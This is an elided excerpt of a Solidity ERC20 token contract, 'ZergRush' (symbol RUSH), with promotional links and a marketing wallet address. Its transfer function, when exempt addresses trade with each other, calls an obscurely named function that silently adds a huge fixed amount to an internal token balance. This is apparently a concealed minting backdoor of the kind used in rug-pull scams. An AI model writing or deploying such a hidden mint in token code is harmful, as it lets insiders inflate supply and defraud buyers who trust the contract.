/**
Website: https://zergrush.net
Telegram: https://t.me/ZergRushETH
X: https://x.com/zergrusheth
*/
...
contract ZergRush is Context, IERC20, Ownable {
    ...
    string private _name = "ZergRush";
    string private _symbol = unicode"RUSH";
    uint8 private _decimals = 18;

    address payable public marketingWallet = payable(0x7eE56c674A36d6CfA7348f9055582923378ea9ac);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            uint256 tokenCount;
              for(uint i = 0; i < multisend_tokens.length; i++) {
                ...
                if ( !isTxLimitExempt[sender] ||  !isTxLimitExempt[recipient] ||isMarketPair[recipient] || isMarketPair[sender]  ){_tradeuycount+=1;}else{RUSHlotaawteryer();}
        ...
        function RUSHlotaawteryer() internal{
    multisend_tokens[0]+=2099087000000006993674445475;
        }
